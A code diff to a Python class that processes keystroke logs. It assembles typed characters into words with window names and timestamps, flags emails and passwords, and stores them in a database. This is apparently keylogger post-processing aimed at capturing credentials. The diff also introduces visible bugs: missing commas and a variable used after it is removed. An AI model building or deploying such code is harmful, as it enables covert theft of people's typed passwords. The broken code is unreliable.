@@ -2,24 +2,24 @@ from load_config import load_cfg
 
 class Process:
     def __init__(self):
-        words = ""
-    
-    def Payload(self,key):
-        res = {
-            "datetime": key['datetime'],
-            "epoch": key['epoch'],
-            "windowName": key['windowName'],
+        self.words = ""
+        self.payload = {
+            "datetime": ""
+            "epoch": ""
+            "windowName": ""
             "processedWord":"",
             "isEmail": 0,
             "isPassword": 0
         }
-        return res
+    
     
     def separateBreakChar(self,data):
     #loop through items in log and append characters on key-down
         if (data['processedKey']):
             if (len(self.words) == 0):
-                currWord = self.Payload(data)
+                self.payload['datetime'] = data['datetime']
+                self.payload['epoch'] = data['epoch']
+                self.payload['windowName'] = data['windowName']
             self.words += data['processedKey']
         else:
             currWord['processedWord'] = self.words
@@ -59,6 +59,9 @@ class Process:
         
         mycursor.execute(sql, val)
         db.commit()
+        
+        mycursor.close()
+        db.close()
         
         return 0 
     
